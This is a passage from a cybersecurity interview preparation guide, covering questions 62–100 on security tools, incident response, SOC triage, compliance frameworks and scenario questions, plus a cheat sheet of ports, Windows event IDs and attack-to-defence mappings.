> - `ip.addr == 192.168.1.50` — traffic to/from one host

---

**62. What is nmap and what does it do?**

Nmap (Network Mapper) is a port scanner and network discovery tool. It identifies which hosts are alive on a network, what ports are open, what services are running, and sometimes what OS the target is using.

> *Key commands:*
> - `nmap 192.168.1.0/24` — discover live hosts on a subnet
> - `nmap -sV target` — detect service versions
> - `nmap -p- target` — scan all 65535 ports
> - `nmap -sS target` — SYN scan (stealthier — doesn't complete handshake)

> *Important:* Only run nmap against systems you own or have explicit written permission to test.

---

**63. What is a SIEM and what does it do?**

A SIEM (Security Information and Event Management) platform centralises logs from across the environment, correlates events to detect threats, and alerts security analysts.

**Core functions:**
- Collects logs from firewalls, servers, endpoints, cloud, applications
- Normalises different log formats into a common structure
- Correlates events: "5 failed logins + 1 success from the same IP = brute force alert"
- Provides historical search for investigation
- Generates dashboards and compliance reports

> *Common SIEMs:* Splunk, Microsoft Sentinel, IBM QRadar, Elastic SIEM.

---

**64. What is an EDR and how is it different from traditional antivirus?**

**Traditional Antivirus:** Signature-based. Compares files against a database of known malicious signatures. Completely blind to new threats (zero-days) and fileless attacks (nothing to scan).

**EDR (Endpoint Detection and Response):** Monitors endpoint behaviour in real-time. Detects suspicious activity (not just known signatures): a Word document spawning PowerShell, unusual outbound connections, suspicious registry modifications. Also provides response capabilities: isolate endpoint, kill process, capture forensic snapshot.

> *Think of AV as:* A wanted poster. Only catches known criminals.
> *Think of EDR as:* A security camera analysing behaviour. Can spot suspicious activity even from someone not on any list.

---

**65. What is a WAF (Web Application Firewall)?**

A WAF sits in front of web applications and inspects HTTP/HTTPS traffic at Layer 7. It specifically protects against web application attacks: SQL injection, XSS, CSRF, path traversal, and other OWASP Top 10 threats.

> *Difference from NGFW:* An NGFW protects the whole network perimeter at multiple layers. A WAF only protects web applications, but much more deeply at Layer 7.

---

**66. What is Burp Suite used for?**

Burp Suite is a web application security testing toolkit used by penetration testers and bug bounty hunters. Its core feature is a proxy that intercepts traffic between your browser and a web application, allowing you to inspect and modify every request and response.

> *Common uses:* Testing for SQL injection, XSS, authentication flaws, insecure direct object references, parameter manipulation.

---

**67. What is the purpose of Nessus?**

Nessus is an automated vulnerability scanner. It probes targets for known vulnerabilities, misconfigurations, default credentials, and missing patches — generating a prioritised report.

> *Key distinction:* Nessus finds vulnerabilities — it doesn't exploit them. That's the difference between a vulnerability scanner and a penetration testing tool.

---

**68. What is Metasploit?**

Metasploit is a penetration testing framework that provides a library of exploits, payloads, and post-exploitation tools. It's used by penetration testers (and unfortunately attackers) to exploit known vulnerabilities.

> *Entry-level understanding needed:* Know what it is, that it's used for authorised testing, and that it contains exploits and payloads. You don't need to know its syntax in depth for entry-level roles unless specifically testing for it.

---

**69. What is Threat Intelligence and how is it used?**

Threat Intelligence is information about current and emerging threats — who is attacking, what methods they use, what infrastructure they operate, and what their targets are. It helps defenders anticipate and prepare for attacks.

**Types:**
- **Strategic** — High-level trends for executive decisions
- **Operational** — Specific campaigns and attacker TTPs
- **Tactical** — IoCs (Indicators of Compromise): malicious IPs, file hashes, domains

> *Practical use:* Receive a threat intel feed listing known malicious IPs → push them to your firewall blocklist automatically. Or: learn an APT group is targeting your industry with spear phishing → run a simulated campaign, update email filters, brief employees.

---

**70. What is Shodan?**

Shodan is a search engine that indexes internet-connected devices and their open ports/services. Unlike Google (which indexes web content), Shodan indexes the banners that devices return when probed.

> *Legitimate use:* Security teams use it to find their own exposed assets — internet-facing services they didn't know about.

> *Attacker use:* Finding exposed webcams, industrial control systems, databases with no authentication, default-credential devices.

> *Why it matters:* If your systems show up on Shodan with unexpected services open, attackers already know. You should find out first.

---

## SECTION 6: INCIDENT RESPONSE & SOC FUNDAMENTALS

---

**71. What are the phases of Incident Response?**

Following the NIST framework, there are 6 phases:

| Phase | What you do |
|-------|------------|
| **Preparation** | Build playbooks, train the team, deploy monitoring tools, establish communication plans |
| **Identification** | Detect the incident — SIEM alert, user report, threat hunting discovery |
| **Containment** | Stop the spread — isolate affected systems (short-term) and prevent re-entry (long-term) |
| **Eradication** | Remove the threat — delete malware, close the attack vector, patch the vulnerability |
| **Recovery** | Restore systems and verify they're clean before returning to production |
| **Lessons Learned** | Post-incident review — what failed, what worked, what to improve |

> *Key insight:* Containment comes BEFORE eradication. You stop the bleeding before you treat the wound.

---

**72. What is the difference between an event, an alert, and an incident?**

- **Event** — Any observable occurrence in a system. Most events are normal. (A user logging in is an event.)
- **Alert** — An event that has been flagged as potentially significant by a security tool. Not all alerts are incidents.
- **Incident** — A confirmed violation of security policies or a threat to systems — requires a response.

> *Example:* 100 failed logins = event. SIEM fires an alert on that pattern = alert. Investigation confirms it's a real attack in progress = incident.

---

**73. What is triage and why is it important in a SOC?**

Triage is the rapid assessment of alerts to determine their severity and priority — so the most critical threats are handled first and limited analyst time isn't wasted on false positives.

**Typical severity levels:**
- **Critical** — Active attack, data exfiltration, ransomware spreading
- **High** — Confirmed compromise, contained
- **Medium** — Suspicious activity, possible compromise
- **Low** — Policy violation, vulnerability found but not exploited

---

**74. What is the order of volatility and why does it matter in forensics?**

When collecting evidence from a compromised system, you collect the most volatile evidence first because it is lost when the system is powered off.

**Order (most to least volatile):**
1. RAM / Memory — running processes, active connections, encryption keys
2. Network state — ARP table, active connections
3. Running processes
4. Disk content — files, logs, registry
5. Remote logs / SIEM data
6. Backups

> *Critical point:* Never immediately power off a compromised system. You lose everything in RAM — including potentially the encryption keys to decrypt ransomware, or evidence of what the attacker was doing.

---

**75. What is an IoC (Indicator of Compromise)?**

Evidence that a system or network has been compromised. Used to detect known threats and share threat intelligence.

> *Examples of IoCs:*
> - Malicious file hash (MD5/SHA-256)
> - Known bad IP address or domain
> - Unusual registry key created by malware
> - Specific file path created by a malware family
> - Unusual outbound connections at regular intervals (C2 beaconing)

> *IoCs are reactive* — they require someone to have seen the attack before. Behavioural detection (BIoC) catches attacks even without prior knowledge of the specific malware.

---

**76. What would you do if you discovered a workstation is communicating with a known malicious IP?**

A structured, methodical answer:
1. **Don't panic** — document what you've observed with timestamps
2. **Isolate the machine** from the network immediately to prevent further communication or lateral movement
3. **Preserve evidence** — memory dump, network connection logs, running processes
4. **Investigate** — what process is making the connection? When did it start? How did the malicious software arrive?
5. **Check for lateral movement** — has this machine connected to other internal systems?
6. **Begin IR process** — escalate to senior analyst / IR team
7. **Eradicate** — once fully understood, rebuild or remediate the system
8. **Block** the malicious IP at the perimeter for all other systems

---

**77. What is MITRE ATT&CK and why should a junior analyst know it?**

MITRE ATT&CK is a publicly available framework cataloguing real-world attacker Tactics, Techniques, and Procedures (TTPs). Organised by the attacker's goals at each phase of an attack.

> *Practical value for a junior analyst:*
> - When you see suspicious PowerShell activity, look it up in ATT&CK (T1059.001) — understand what attackers do with it
> - Use it to understand *why* an alert fired, not just that it fired
> - Helps you search for related activity in logs — if you see one technique, ATT&CK shows you what attackers typically do next

---

**78. What is a playbook in the context of incident response?**

A playbook is a documented, step-by-step guide for how to respond to a specific type of incident. It removes uncertainty under pressure and ensures consistent, complete responses.

> *Example:* A phishing playbook would include steps for: collecting the email headers, analysing the link/attachment safely, identifying affected users, resetting credentials, blocking the domain at the email gateway, and communicating with users.

---

**79. What is threat hunting?**

Proactively searching through systems, networks, and logs to find threats that have evaded automated detection — rather than waiting for an alert.

**Differs from alert response:** Alert response is reactive (an alert fires, you investigate). Threat hunting is proactive (analyst forms a hypothesis and goes looking).

> *Example:* An analyst reads that a known threat actor uses PowerShell encoded commands for lateral movement. Even with no alert fired, they search their SIEM for PowerShell processes with base64-encoded command-line arguments. They find something. That's threat hunting.

---

**80. What is chain of custody and why does it matter?**

A documented, unbroken record of who collected evidence, who handled it, when, and what was done with it. Required for evidence to be legally admissible in court or disciplinary proceedings.

> *If the chain breaks:* A defence attorney can argue the evidence was tampered with or contaminated, potentially having it excluded from proceedings. This can mean an attacker walks free or a civil case is lost.

---

## SECTION 7: GOVERNANCE, RISK & COMPLIANCE

---

**81. What is risk management in cybersecurity?**

The systematic process of identifying, assessing, prioritising, and responding to security risks to the organisation.

**Process:** Identify assets → Identify threats and vulnerabilities → Assess risk (likelihood × impact) → Choose response (avoid, mitigate, transfer, accept) → Monitor and review.

---

**82. What is GDPR and what does it require?**

GDPR (General Data Protection Regulation) is an EU law governing how organisations collect, process, and store personal data of EU citizens.

**Key requirements:**
- Must have a lawful basis to process personal data
- Data minimisation — only collect what you need
- Right to erasure ("right to be forgotten")
- Breach notification within **72 hours** to the supervisory authority
- Privacy by design and default

**Penalty:** Up to €20 million or 4% of global annual turnover — whichever is higher.

---

**83. What is PCI-DSS and who must comply?**

PCI-DSS (Payment Card Industry Data Security Standard) applies to any organisation that processes, stores, or transmits payment card data. It sets requirements for securing cardholder data.

Key requirements: encrypt cardholder data in transit and at rest, maintain a vulnerability management programme, restrict access (least privilege, MFA), monitor all access to network resources, maintain an information security policy.

---

**84. What is the NIST Cybersecurity Framework?**

A voluntary framework providing a common language for managing cybersecurity risk, organised around 5 functions:

- **Identify** — Know your assets, risks, and environment
- **Protect** — Implement safeguards (access control, training, encryption)
- **Detect** — Monitor for threats and anomalies continuously
- **Respond** — Contain, analyse, and mitigate incidents
- **Recover** — Restore operations and improve after incidents

> *Why it matters:* Many organisations map their security programme to the NIST CSF. Knowing it shows interviewers you understand security as a programme, not just individual tools.

---

**85. What is the difference between a policy, standard, and procedure?**

Three types of governance documents with different levels of specificity:

- **Policy** — The high-level "what and why." Mandatory. "All sensitive data must be encrypted at rest."
- **Standard** — The specific "how" requirements. Mandatory. "AES-256 must be used for data at rest encryption."
- **Procedure** — The step-by-step "do this." How to implement the standard. "To encrypt a database column, follow these steps..."

> *Analogy:* Policy = "We obey traffic laws." Standard = "Speed limit is 60km/h on highways." Procedure = "How to safely merge onto a highway."

---

## SECTION 8: SCENARIO & THINKING QUESTIONS
*These reveal how you reason, not just what you've memorised.*

---

**86. Your SIEM shows 5,000 failed login attempts on one account in 10 minutes, then a successful login. What happened and what do you do?**

**What happened:** A brute force attack succeeded. The attacker tried thousands of passwords and eventually found the right one.

**What to do:**
1. Immediately disable the compromised account to prevent further activity
2. Check what the account did after the successful login — what systems did it access? Did it create anything? Change anything?
3. Identify the source IP(s) of the failed attempts — block them
4. Check if the same IP has attempted other accounts
5. Determine if the account was used for lateral movement
6. Reset the password and require MFA before re-enabling
7. Investigate how the correct password was found — was it in a leaked credential database?
8. Document and escalate following your IR process

---

**87. A user calls saying their computer is running very slowly and files are disappearing. What do you think is happening and what are your first steps?**

**Initial hypothesis:** This could be ransomware in the early stages of encrypting files, a malware infection consuming resources, or disk failure — treat as ransomware until ruled out.

**First steps:**
1. Ask the user to stop what they're doing and don't close anything
2. Immediately isolate the machine from the network — disconnect from Wi-Fi or unplug ethernet. Do NOT shut it down.
3. Check your EDR console — is there ransomware activity? Unusual process spawning? Rapid file modifications?
4. If confirmed ransomware: initiate IR process, check if network shares are being encrypted, assess spread
5. Preserve memory (RAM dump) if possible before any shutdown
6. Identify what files have been changed and what process changed them
7. Check for other machines showing the same behaviour

---

**88. You're new to a SOC and receive an alert about a PowerShell command running on a workstation. How do you investigate?**

Methodical investigation steps:
1. **What was the command?** Check Event ID 4688 (process creation with command-line logging) or PowerShell Event ID 4104 (script block logging)
2. **What process spawned it?** The parent process matters. PowerShell spawned by `explorer.exe` (user ran it) is less suspicious than PowerShell spawned by `winword.exe` (macro malware)
3. **What did the command do?** Did it make network connections? Write files? Access other systems?
4. **Is the command encoded?** Base64-encoded PowerShell (`-EncodedCommand`) is a major red flag
5. **Who was logged in?** Does this match what that user normally does?
6. **Check the machine's network connections** around the same time — any outbound connections to unusual IPs?
7. **Correlate with your threat intel** — does the command match known malware behaviour?

---

**89. How would you explain what a firewall does to someone who has never worked in IT?**

"A firewall is like a security guard at the entrance of a building. When someone tries to come in or when someone inside tries to send something out, the guard checks it against a list of rules. If the visitor is expected and authorised — they get through. If they're not on the list, or they're trying to get into a restricted area, they're turned away. It doesn't check what people are carrying in detail — it mainly checks whether they should be there at all."

> *Why this question is asked:* In a real job, you'll need to explain security concepts to non-technical colleagues, managers, and users. Communication is a core skill.

---

**90. You find an open port 3389 (RDP) exposed to the internet on a production server. What is the risk and what would you recommend?**

**Risk:** RDP exposed to the internet is one of the most common initial access vectors for ransomware groups. Attackers scan the internet for open 3389 constantly and attempt brute force, credential stuffing, or exploit known RDP vulnerabilities (e.g., BlueKeep).

**Recommendations:**
1. **Immediate:** If RDP must be used, put it behind a VPN — no direct internet exposure
2. **Enable Network Level Authentication (NLA)** — requires authentication before session setup
3. **Restrict by IP** — only allow known admin source IPs via firewall rules
4. **Enable MFA** on the RDP accounts
5. **Change the port** (security through obscurity — not a fix, but reduces automated scanning)
6. **Audit who needs RDP access** — likely far fewer people than currently have it
7. **If RDP isn't required** — close the port entirely

---

**91. What would you do on your first week as a SOC analyst to understand the environment you're protecting?**

A strong answer shows curiosity and methodology:

1. **Asset inventory** — What systems, servers, and endpoints exist? What is the crown jewel data?
2. **Network topology** — How is the network segmented? Where are the choke points?
3. **Understand the SIEM** — What log sources are feeding in? What alerts exist and what are the thresholds?
4. **Review recent incidents** — What attacks have hit this environment before? What was learned?
5. **Review policies** — What are the acceptable use, incident response, and escalation policies?
6. **Understand normal** — What does normal traffic and behaviour look like here? You can't spot anomalies without a baseline.
7. **Meet the team** — Who do you escalate to? Who owns each system?

---

**92. You receive a phishing email at work that got through your email filters. What do you do?**

**What you should NOT do:** Click anything, open attachments, try to investigate it from your work machine without a safe analysis environment.

**What you should do:**
1. **Report it immediately** using your organisation's reporting mechanism (don't just delete it — security needs the data)
2. **Don't click** any links or open any attachments
3. **Note the details** — sender, subject, time received, any URLs (hover, don't click)
4. **Check if others received it** — is this a targeted or mass campaign?
5. **Provide the full email headers** to the security team for analysis
6. **Help the security team block** the sender domain and URLs at the gateway
7. **Check if anyone else clicked** — if this is an active campaign, identify victims quickly

---

**93. What is the first thing you do when you suspect a system has been compromised?**

**Contain before you investigate.** The instinct is to start investigating — but if the attacker is still active, every second of delay allows more damage, more lateral movement, more exfiltration.

1. **Isolate the system** from the network first — without shutting it down
2. **Document what you know** before touching anything — time, what triggered suspicion, what you observe
3. **Preserve volatile evidence** — don't reboot
4. **Notify your team** — don't investigate a potential incident alone
5. **Then investigate** — once contained, you can look at logs, processes, connections safely

---

**94. If a colleague asks you to share your login credentials to check something "quickly," what do you do?**

**Never share your credentials.** Period. Regardless of who is asking.

The right response: "I can't share my credentials — that's against our security policy and it would also make it impossible to track who took which action in the logs. Let me help you by either logging in myself and showing you, or I can help you get the access you need through the proper request process."

> *Why this is a test question:* Interviewers want to see that you understand personal accountability, audit trail integrity, and that you won't break policy under social pressure. The correct answer is firm but not hostile.

---

**95. What would you check if a web application suddenly started responding very slowly or returning errors?**

Investigate from multiple angles:

1. **Is it just slow or down?** Check monitoring dashboards and status pages
2. **Is it a DDoS?** Check inbound traffic volume — massive spike = possible DDoS
3. **Is it a resource issue?** Check CPU, memory, disk on the server — could be malware consuming resources or a non-security issue
4. **Check web server logs** — unusual spike in requests, scanning patterns, large numbers of 4xx/5xx errors
5. **Check WAF logs** — is it blocking a lot of attack traffic?
6. **Check for recently deployed changes** — was there a deployment that broke something?
7. **Check database** — slow queries, connection exhaustion?

---

## SECTION 9: FINAL IMPORTANT CONCEPTS

---

**96. What is the difference between encoding, encryption, and hashing?**

Three completely different operations that look similar on the surface:

- **Encoding** — Transforms data into a different format for compatibility, NOT for security. Anyone can reverse it — it provides zero protection. (Base64, URL encoding)
- **Encryption** — Transforms data to protect its confidentiality. Reversible only with the correct key.
- **Hashing** — One-way transformation. Cannot be reversed. Used to verify integrity.

> *Common mistake:* Base64 is NOT encryption. Seeing base64-encoded data does not mean it's secure — anyone can decode it instantly.

---

**97. What is a CVE and CVSS?**

- **CVE (Common Vulnerabilities and Exposures)** — A standardised ID assigned to a publicly known vulnerability. Example: CVE-2021-44228 (Log4Shell). Gives everyone a common name to refer to a specific vulnerability.
- **CVSS (Common Vulnerability Scoring System)** — A 0–10 numerical score reflecting the severity of a vulnerability. Critical ≥ 9.0, High 7.0–8.9, Medium 4.0–6.9, Low < 4.0.

> *Practical use:* When a new CVE is published, the CVSS score helps prioritise patching. Not all vulnerabilities are equally urgent.

---

**98. What is patch management and why is it important?**

Patch management is the systematic process of identifying, acquiring, testing, and deploying software updates (patches) that fix vulnerabilities and bugs.

> *Why it matters:* The majority of successful attacks exploit known vulnerabilities that had patches available. WannaCry exploited a vulnerability (EternalBlue) that Microsoft had patched two months before the outbreak — organisations that hadn't patched were devastated.

**Best practice:** Patch critical and high CVSSs within 24–72 hours. High within 7 days. Medium within 30 days. Have a tested rollback process.

---

**99. What is the difference between a red team and a blue team?**

- **Red Team** — Offensive. Simulates real-world attackers to test the organisation's defences. Uses the same tools and techniques real attackers would use.
- **Blue Team** — Defensive. Monitors, detects, and responds to attacks — including the red team's simulated attacks.
- **Purple Team** — Red and blue working together collaboratively in real-time — red team shows attack technique, blue team immediately works on detection/response for it.

> *Why this matters for entry-level:* Most entry-level roles are blue team. Understanding both sides makes you better at each.

---

**100. Why do you want to work in cybersecurity?**

This is always the closing question. Interviewers aren't looking for a rehearsed speech — they're looking for genuine motivation, because the field is demanding and people without real interest burn out quickly.

**What makes a strong answer:**
- A specific moment or experience that sparked your interest
- Curiosity about how things work — and how they break
- The challenge and variety of the work
- The real-world impact of protecting people and organisations

**What to avoid:** "I heard it pays well" (even if partly true). "I like computers." Generic answers with no specific connection to security.

> *The honest truth an interviewer is listening for:* Do you talk about security the way someone who is genuinely interested talks? Do your eyes light up when you describe an attack or a concept? That enthusiasm — not just knowledge — is what makes someone want to hire you.

---

## QUICK-REFERENCE CHEAT SHEET

### Ports — Know These Cold
```
22   SSH          (secure remote access)
23   Telnet       (insecure — plaintext)
25   SMTP         (email sending)
53   DNS          (name resolution — UDP/TCP)
80   HTTP         (unencrypted web)
443  HTTPS        (encrypted web)
445  SMB          (Windows file sharing — high risk)
3389 RDP          (Windows remote desktop — high risk)
389  LDAP         (directory — plaintext)
636  LDAPS        (directory — encrypted)
```

### The CIA Triad Applied to Attacks
```
Ransomware      → All three (C + I + A)
Data theft      → Confidentiality
Log tampering   → Integrity
DDoS            → Availability
Password crack  → Confidentiality
```

### Attack → Defence Quick Map
```
Phishing         → DMARC/DKIM/SPF + user training + MFA
Brute force      → Account lockout + MFA + rate limiting
SQL Injection    → Parameterised queries
XSS              → Output encoding + CSP headers
ARP Spoofing     → Dynamic ARP Inspection (DAI)
MITM             → TLS/HTTPS + certificate validation
Ransomware       → Offline backups + EDR + segmentation
Social Eng.      → User training + verification processes
DDoS             → Rate limiting + CDN + scrubbing
```

### Event IDs — Essential for SOC Roles
```
4624  Successful login
4625  Failed login
4648  Explicit credential use  (lateral movement)
4672  Admin privileges at login
4688  Process created           (watch parent-child)
4698  Scheduled task created    (persistence)
4720  User account created      (backdoor?)
1102  Security log CLEARED      (⚠ critical alert)
7045  Service installed          (persistence)
```

### Hashing — Know What to Use
```
Passwords:       bcrypt / Argon2 / scrypt  (slow = good)
File integrity:  SHA-256                   (fast = good)
Avoid:           MD5, SHA-1                (broken)
```

---

*100 questions. No fluff. Everything here comes up.*

---

> **One last thing:** The best candidates I've hired over 20 years weren't the ones who knew the most facts. They were the ones who could think clearly under pressure, admit what they didn't know, and reason their way to a sensible answer. Walk into that interview calm, be honest, and think out loud. That's what gets you hired.
>
> **Good luck.**
